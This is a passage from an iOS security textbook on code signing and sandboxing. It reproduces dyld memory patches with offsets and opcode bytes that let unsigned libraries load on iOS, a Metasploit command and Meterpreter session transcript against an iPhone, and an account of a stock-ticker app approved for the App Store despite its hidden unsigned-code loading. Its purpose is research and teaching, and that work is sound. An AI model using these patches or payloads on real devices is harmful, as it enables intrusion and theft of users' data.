fgNextPIEDylibAddress_ptr
//
ptr_to_fgNextPIEDylibAddress_ptr = (unsigned int *) (x + 0x2604c);
fgNextPIEDylibAddress_ptr = (unsigned int *) (x + 0x26320);
*ptr_to_fgNextPIEDylibAddress_ptr = (unsigned int)
fgNextPIEDylibAddress_ptr;
*fgNextPIEDylibAddress_ptr = next_mmap;
The next patch is in the function from dyld shown here:
uintptr_t ImageLoaderMachO::reserveAnAddressRange(size_t length,
const ImageLoader::LinkContext& context)
{
vm_address_t addr = 0;
vm_size_t size = length;
// in PIE programs, load initial dylibs after main
// executable so they don’t have fixed addresses either
if ( fgNextPIEDylibAddress != 0 ) {
// add small (0-3 pages) random padding between dylibs
addr = fgNextPIEDylibAddress +
(__stack_chk_guard/fgNextPIEDylibAddress &
(sizeof(long)-1))*4096;
kern_return_t r = vm_allocate(mach_task_self(),
&addr, size,
VM_FLAGS_FIXED);
if ( r == KERN_SUCCESS ) {
fgNextPIEDylibAddress = addr + size;
return addr;
}
fgNextPIEDylibAddress = 0;
}
kern_return_t r = vm_allocate(mach_task_self(), &addr,
size, VM_FLAGS_ANYWHERE);
if ( r != KERN_SUCCESS )
throw “out of address space”;
return addr;
}
Basically, this function tries to allocate some space where requested, and if
that doesn’t work, it just allocates some space at a random location. You need
it to put the new library in your existing RWX region, but when it tries to
allocate there it will fail because there is already something allocated there.
You simply patch out the check and let it return as if it really allocated some
space in the RWX region. The following patch removes the comparison so
cc0044..iinndddd 9999 44//1166//22001122 55::4433::5511 PPMM
100 Chapter 4 n Code Signing and Memory Protections
that the function will ignore the return value of the fi rst vm_allocate func-
tion and return addr:
//
// patch 2: ignore vmalloc in reserveAnAddressRange
//
unsigned int patch2 = (unsigned int) x + 0xc9de;
memcpy((unsigned int *) patch2, “\xc0\x46”, 2); // thumb nop
The next patch is the most complicated one. In this one you replace the call
to mmap in mapSegments with a call to read. Instead of actually mapping in a
fi le, you want it to just read the fi le into your RWX region. Before the patch it
looks like this:
void ImageLoaderMachO::mapSegments(int fd, uint64_t offsetInFat,
uint64_t lenInFat, uint64_t fileLen, const LinkContext& context)
{
...
void* loadAddress = mmap((void*)requestedLoadAddress, size,
protection, MAP_FIXED | MAP_PRIVATE, fd, fileOffset);
...
When you patch it, it looks like this:
read(fd, requestedLoadAddress, size);
The actual patch is shown here.
//
// patch3: mmap in mapSegments
//
unsigned int patch3 = (unsigned int) x + 0xdd4c;
memcpy((unsigned int *) patch3,
“\x05\x98\x08\x99\x32\x46\x32\x46\x32\x46\x32\x46\x32\x46\x8c\x23
\x1b\x02\x45\x33\x1b\x44\x7b\x44\x98\x47”, 26);
Normally, after calling dlopen, the fgNextPIEDylibAddress is reset to 0. You
don’t want this to happen. The fi nal patch nop’s the code responsible for that
in ImageLoader::link.
Before the patch, the function ends like this:
// done with initial dylib loads
fgNextPIEDylibAddress = 0;
}
You simply nop the last line with the following patch:
//
// patch4: don’t reset the fgNextPIEDylibAddress after dlopen
//
cc0044..iinndddd 110000 44//1166//22001122 55::4433::5522 PPMM
Chapter 4 n Code Signing and Memory Protections 101
unsigned int patch4 = (unsigned int) x + 0xbc34;
memcpy((unsigned int *) patch4, “\xc0\x46”, 2);
Now that you have patched your copy of dyld, it will load libraries into
the RWX region you have. Furthermore, because you changed the pointers in
libdyld.dylib to point to your copy of dyld, code that calls the real dlopen or
dlsym (contained in libdyld) will actually end up calling your patched copy of
dyld, which will load libraries into the RWX region you have. In other words,
after the application of these patches, an iOS application’s calls to dlopen and
dlsym will load and execute unsigned libraries!
Using Meterpreter on iOS
At this point it is easy to write high-level libraries for apps to load or for exploits
to leverage. These libraries might contain other exploits to try to elevate privileges,
payloads to sniff web traffi c, code to upload the contents of the Address Book,
and so on. Perhaps the ultimate payload is Meterpreter, from the Metasploit
framework. It is not too hard to take Meterpreter, recompile it for ARM, and
load it with this method. The result is an interactive shell-like experience on
a device that has no shell! Following is an excerpt from a transcript of meter-
preter running against a factory (not provisioned, not jailbroken) iPhone. (The
Meterpreter library will be available on the book’s website at www.wiley.com/
go/ioshackershandbook).
$ ./msfcli exploit/osx/test/exploit RHOST=192.168.1.2 RPORT=5555
LPORT=5555 PAYLOAD=osx/armle/meterpreter/bind_tcp DYLIB=metsrv-
combo-phone.dylib AutoLoadStdapi=False E
[*] Started bind handler
[*] Transmitting stage length value...(3884 bytes)
[*] Sending stage (3884 bytes)
[*] Sleeping before handling stage...
[*] Uploading Mach-O dylib (97036 bytes)...
[*] Upload completed.
[*] Meterpreter session 1 opened (192.168.25.129:51579 ->
192.168.1.2:5555)
meterpreter > use stdapi
Loading extension stdapi...success.
meterpreter > ls
Listing: /
==========
Mode Size Type Last modified Name
---- ---- ---- ------------- ----
41775/rwxrwxr-x 714 dir Tue Aug 30 05:41 2011 .
41775/rwxrwxr-x 714 dir Tue Aug 30 05:41 2011 ..
cc0044..iinndddd 110011 44//1166//22001122 55::4433::5522 PPMM
102 Chapter 4 n Code Signing and Memory Protections
41333/-wx-wx-wx 68 dir Tue Aug 30 05:41 2011 .Trashes
100000/--------- 0 fil Thu Aug 25 20:31 2011 .file
40775/rwxrwxr-x 1258 dir Tue Aug 30 05:36 2011 Applications
40775/rwxrwxr-x 68 dir Thu Aug 25 22:08 2011 Developer
40775/rwxrwxr-x 646 dir Tue Aug 30 05:27 2011 Library
40755/rwxr-xr-x 102 dir Thu Aug 25 22:16 2011 System
40755/rwxr-xr-x 102 dir Tue Aug 30 05:36 2011 bin
41775/rwxrwxr-x 68 dir Thu Aug 25 20:31 2011 cores
40555/r-xr-xr-x 1625 dir Thu Sep 01 06:03 2011 dev
40755/rwxr-xr-x 544 dir Thu Sep 01 05:55 2011 etc
40755/rwxr-xr-x 136 dir Thu Sep 01 05:55 2011 private
40755/rwxr-xr-x 476 dir Tue Aug 30 05:37 2011 sbin
40755/rwxr-xr-x 272 dir Tue Aug 30 05:18 2011 usr
40755/rwxr-xr-x 952 dir Thu Sep 01 05:59 2011 var
meterpreter > getpid
Current pid: 518
meterpreter > getuid
Server username: mobile
meterpreter > ps
Process list
============
PID Name Path
--- ---- ----
0 kernel_task
1 launchd
12 UserEventAgent
13 notifyd
14 configd
16 syslogd
17 CommCenterClassi
20 lockdownd
25 powerd
28 locationd
30 wifid
32 ubd
45 mediaserverd
46 mediaremoted
47 mDNSResponder
49 imagent
50 iapd
52 fseventsd
53 fairplayd.N90
59 apsd
60 aggregated
65 BTServer
67 SpringBoard
74 networkd
cc0044..iinndddd 110022 44//1166//22001122 55::4433::5522 PPMM
Chapter 4 n Code Signing and Memory Protections 103
85 lsd
88 MobileMail
90 MobilePhone
113 Preferences
312 TheDailyHoff
422 SCHelper
426 Music~iphone
433 ptpd
437 afcd
438 atc
442 notification_pro
480 notification_pro
499 springboardservi
518 test-dyld
519 sandboxd
520 securityd
meterpreter > sysinfo
Computer: Test-iPhone
OS : ProductBuildVersion: 9A5313e,
ProductCopyright: 1983-2011 Apple Inc.,
ProductName: iPhone OS, ProductVersion: 5.0, ReleaseType: Beta
meterpreter > vibrate
meterpreter > ipconfig
lo0
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0
en0
Hardware MAC: 5c:59:48:56:4c:e6
IP Address : 192.168.1.2
Netmask : 255.255.255.0
Gaining App Store Approval
Every app that appears in the iOS App Store must be examined and approved
by Apple. There is not a lot of information available on what exactly this process
entails. The documented cases of app rejection usually involve copyright issues,
competition issues, or use of available, but private API functions. Although the
App Store approval process has been effective in keeping malicious apps out of
the App Store, it is not clear exactly how many malicious apps were submitted
but rejected during the inspection.
This non-transparent process begs the question whether an app that took
advantage of the code signing bug covered in this chapter would make it through
the review process, or whether it would be caught. To test this, Charlie Miller
submitted an app that could download and execute arbitrary (unsigned) librar-
ies from a server he controlled.
cc0044..iinndddd 110033 44//1166//22001122 55::4433::5522 PPMM
104 Chapter 4 n Code Signing and Memory Protections
NOTE Special thanks to Jon Oberheide and Pavel Malik for helping with this.
The app was supposed to be a stock ticker program. Otherwise, besides calling
dlopen/dlsym by way of function pointers rather than directly, he did not go out of
his way to hide what the program did. There was a large portion of code that would
never get executed during testing by Apple (because he did not put a library in
the place the app called out to); that code did much pointer manipulation, mmap’d
a fi le with RWX permissions, and proceeded to load the library. See Figure 4.11.
Figure 4.11: The InstaStock program contains code that can load arbitrary unsigned
code in the App Store.
He even submitted it under his own name! After a weeklong review of the
app, it was approved by Apple and made available in the App Store. Clearly,
the App Store review process is not too thorough from a security perspective.
Summary
In this chapter you learned about the importance of code signing on iOS, and
how it makes attacks harder, and greatly limits malware on the platform. This
was followed by a walkthrough of the code, both from the XNU kernel as well
cc0044..iinndddd 110044 44//1166//22001122 55::4433::5522 PPMM
Chapter 4 n Code Signing and Memory Protections 105
as the portions in the iOS kernel binary, that implements Mandatory C ode
Signing. You also came to understand the exception to code signing, which
is used for just-in-time compiling in MobileSafari, as well as all associated
code for that feature. Finally, some attacks on codesigning were discussed,
including injecting shellcode against MobileSafari and a bug in the way code
signing works that allows unsigned libraries to be loaded, at least until the
vulnerability is patched.
cc0044..iinndddd 110055 44//1166//22001122 55::4433::5533 PPMM
cc0044..iinndddd 110066 44//1166//22001122 55::4433::5533 PPMM
CHAPTER
5
Sandboxing
iOS provides multiple layers of exploitation mitigation. Data Execution Prevention
(DEP) and Address Space Layout Randomization (ASLR) increase the investment
required to gain code execution, but other mitigations are necessary to limit
damage in case code execution is realized. Apple’s iOS sandbox, descending
from a similar system found in OS X, provides one method to limit the actions
performed by a process.
The goal of the sandbox is to limit post-code-execution actions by providing
an interface for bounding the behavior of a process. Imagine a PDF rendering
application: One subsystem of the application parses the opened fi le to produce
an internal representation. Another subsystem, in charge of rendering this docu-
ment to the screen, consumes this internal representation. Because the parsing
subsystem is most vulnerable to attack when it processes user-supplied input, it
needs access to the input fi le and little else. By preventing this subsystem from
opening other fi les, executing other programs, or using the network, an attacker’s
actions post-code-execution are limited. In theory, this is straightforward and
easy to implement; in practice, bounding the expected behavior of a process is
diffi cult and prone to error.
This chapter discusses the design and implementation of the iOS sandbox. By
stepping through the code used to confi gure and enforce the profi le for a given
process, you gain the knowledge needed to perform more advanced audits of
the iOS sandbox enforcement system. Most of the chapter is spent discussing
the undocumented parts of the system.
107
cc0055..iinndddd 110077 44//1166//22001122 55::4444::2244 PPMM
108 Chapter 5 n Sandboxing
Understanding the Sandbox
Originally codenamed “Seatbelt,” the Apple sandbox fi rst existed on OS X.
Just like AMFI, discussed in Chapter 4, it is implemented as a policy module
for the TrustedBSD mandatory access control (MAC) framework. TrustedBSD
was ported from FreeBSD to the XNU kernel. The sandbox framework adds
signifi cant value by providing a user space confi gurable, per-process profi le on
top of the TrustedBSD system call hooking and policy management engine. In
other words, TrustedBSD provides the hooking, but the sandbox provides the
brains to enforce a confi gured profi le.
The sandbox is made up of the following components:
n A set of user space library functions for initializing and confi guring the